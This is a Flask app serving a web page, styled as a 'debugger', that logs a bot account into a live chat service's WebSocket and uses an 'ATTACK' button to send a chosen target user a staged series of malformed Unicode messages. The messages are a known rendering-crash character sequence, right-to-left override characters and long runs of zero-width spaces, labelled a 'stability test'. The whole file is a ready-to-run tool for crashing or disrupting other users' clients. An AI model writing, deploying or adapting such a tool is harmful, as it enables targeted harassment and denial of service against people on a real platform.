import os
from flask import Flask, render_template_string

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TITAN DEBUGGER v4.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --neon: #00f3ff; --term: #00ff41; --danger: #ff003c; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Consolas', monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        /* Top Control Center */
        .controls { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); z-index: 10; display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        input { background: #000; border: 1px solid #333; color: var(--neon); padding: 10px; border-radius: 4px; font-size: 12px; }
        .btn-group { display: flex; gap: 5px; }
        button { flex: 1; padding: 10px; font-weight: bold; cursor: pointer; border: 1px solid var(--neon); background: transparent; color: var(--neon); text-transform: uppercase; font-size: 11px; }
        button:hover { background: var(--neon); color: #000; }
        .attack-btn { border-color: var(--danger); color: var(--danger); }
        .attack-btn:hover { background: var(--danger); color: #fff; }

        /* Full Screen Debug Terminal */
        .terminal-wrapper { flex: 1; display: flex; flex-direction: column; background: #000; overflow: hidden; }
        .terminal-header { background: #1a1a1a; padding: 8px 15px; font-size: 11px; color: #888; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
        .terminal-body { flex: 1; overflow-y: scroll; padding: 15px; font-size: 12px; scroll-behavior: smooth; }
        
        /* Log Formatting */
        .line { margin-bottom: 8px; border-left: 3px solid #222; padding-left: 12px; word-break: break-all; white-space: pre-wrap; }
        .in { color: var(--term); border-color: var(--term); }
        .out { color: var(--neon); border-color: var(--neon); }
        .err { color: var(--danger); border-color: var(--danger); }
        .sys { color: #777; border-color: #444; }
        .payload-dump { background: #080808; padding: 8px; margin-top: 5px; display: block; border: 1px solid #1a1a1a; color: #00ccff; font-size: 11px; }
        
        /* Auto Scrollbar */
        .terminal-body::-webkit-scrollbar { width: 10px; }
        .terminal-body::-webkit-scrollbar-track { background: #000; }
        .terminal-body::-webkit-scrollbar-thumb { background: #222; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="controls">
        <input type="text" id="user" placeholder="Bot User">
        <input type="password" id="pass" placeholder="Bot Pass">
        <input type="text" id="room" placeholder="Room Name">
        <input type="text" id="target" placeholder="Target ID">
        <div class="btn-group">
            <button onclick="connect()">CONNECT</button>
            <button class="attack-btn" onclick="executeAttack()">ATTACK</button>
            <button style="border-color:#555; color:#555" onclick="clearTerm()">CLEAR</button>
        </div>
    </div>

    <div class="terminal-wrapper">
        <div class="terminal-header">
            <span>TERMINAL_RECV_LOG [WEBSOCKET_MONITOR]</span>
            <span id="socket-status" style="color:var(--danger)">DISCONNECTED</span>
        </div>
        <div id="terminal" class="terminal-body">
            <div class="line sys">System initialized. Awaiting user login...</div>
        </div>
    </div>

    <script>
        let ws;
        let keepAlive;
        const terminal = document.getElementById('terminal');

        function log(msg, type='sys', payload=null) {
            const div = document.createElement('div');
            div.className = `line ${type}`;
            let content = `<b>[${new Date().toLocaleTimeString()}]</b> ${msg}`;
            if(payload) {
                content += `<div class="payload-dump">${JSON.stringify(payload, null, 2)}</div>`;
            }
            div.innerHTML = content;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function clearTerm() { terminal.innerHTML = ''; log("Terminal cleared.", "sys"); }

        function connect() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            if(!u || !p) return log("Credentials missing!", "err");

            ws = new WebSocket("wss://chatp.net:5333/server");

            ws.onopen = () => {
                document.getElementById('socket-status').innerText = "ONLINE";
                document.getElementById('socket-status').style.color = "var(--term)";
                log("Connection established. Sending login packet...", "sys");
                
                const loginData = {handler:"login", id: Math.random(), username: u, password: p};
                ws.send(JSON.stringify(loginData));
                log("OUTBOUND >> LOGIN_REQUEST", "out", loginData);

                // Start Ping
                keepAlive = setInterval(() => {
                    if(ws.readyState === 1) ws.send(JSON.stringify({handler:"ping"}));
                }, 25000);
            };

            ws.onmessage = (e) => {
                const data = jsonParse(e.data);
                log("INBOUND << " + (data.handler || "EVENT"), "in", data);

                if(data.handler === "login_event" && data.type === "success") {
                    const r = document.getElementById('room').value;
                    log("Authorized! Joining room: " + r, "sys");
                    ws.send(JSON.stringify({handler:"room_join", id: Math.random(), name: r}));
                }
            };

            ws.onclose = () => {
                clearInterval(keepAlive);
                document.getElementById('socket-status').innerText = "OFFLINE";
                document.getElementById('socket-status').style.color = "var(--danger)";
                log("WebSocket closed.", "err");
            };
        }

        function jsonParse(str) { try { return JSON.parse(str); } catch(e) { return {raw: str}; } }

        function executeAttack() {
            const t = document.getElementById('target').value;
            if(!ws || ws.readyState !== 1 || !t) return log("Bot not ready or Target ID missing!", "err");

            log("Executing multi-stage stability test...", "out");
            const payloads = [
                "జ్ఞा" + " ҉ ".repeat(15), 
                "\\u202E" + "STABILITY_CHECK" + "\\u202D",
                "BUFFER_STRESS" + "\\u200B".repeat(150)
            ];

            payloads.forEach((p, i) => {
                setTimeout(() => {
                    const pkt = {handler: "chat_message", to: t, type: "text", body: p, is_private: true};
                    ws.send(JSON.stringify(pkt));
                    log(`STAGE ${i+1}: Payload injected to ${t}`, "out", pkt);
                }, i * 1200);
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    # Render aur local dono ke liye Port support
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
